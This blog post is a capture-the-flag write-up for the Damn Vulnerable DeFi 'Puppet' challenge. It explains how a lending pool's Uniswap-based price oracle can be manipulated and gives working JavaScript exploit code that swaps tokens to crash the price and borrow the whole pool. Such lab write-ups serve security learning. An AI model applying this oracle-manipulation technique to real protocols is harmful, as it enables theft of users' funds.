---
layout: post
title: Damn Vulnerable DeFi - Puppet
---

## Description
There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an [Uniswap v1 exchange](https://docs.uniswap.org/protocol/V1/introduction), currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

## Solution
This challenge is really interesting because it forced me to dive into the Uniswap contracts. My idea was to exploit
the PuppetPool's method for computing the required deposit

```
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * 2 / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

It uses the uniswap pair as a price oracle. If we can manipulate the uniswap pair then we can manipulate the deposit
required in the lending pool.

I found a function called [tokenToEthSwapInput](https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L221) on the uniswap contract that allows you to deposit tokens into a pool and get eth in return.
If the attacker deposits all their tokens into the uniswap pool it would drive up `token.balanceOf(uniswapPair)`. This
would in turn drive down the PuppetPool's oracle price. This resulted in a successful exploit, all in Javascript:

```
it('Exploit', async function () {
    await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
    // Flood the pool with tokens. This will drive down PuppetPool's "oracle price"
    await this.uniswapExchange.connect(attacker)
        .tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), "1", (await ethers.provider.getBlock('latest')).timestamp * 2)

    const amountToSteal = await this.token.balanceOf(this.lendingPool.address)
    // deposit required will be small now that the uniswap pool's token balance is huge.
    const deposit = await this.lendingPool.calculateDepositRequired(amountToSteal)

    await this.lendingPool.connect(attacker).borrow(amountToSteal, {value: deposit})
})
```